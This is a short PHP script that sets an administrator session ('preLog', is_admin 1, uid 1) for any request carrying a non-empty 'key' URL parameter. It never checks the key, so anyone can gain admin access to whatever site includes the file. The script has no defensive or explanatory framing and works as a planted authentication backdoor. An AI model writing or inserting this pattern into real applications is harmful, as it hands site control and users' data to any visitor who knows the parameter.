<?php
session_start();
$code = $_GET['key'];
if($code)
{
    $_SESSION['admin'] = ['username'=>'preLog','email'=>'preLog@qq.com','is_admin'=>1,'uid'=>1,'key'=>$code];
}
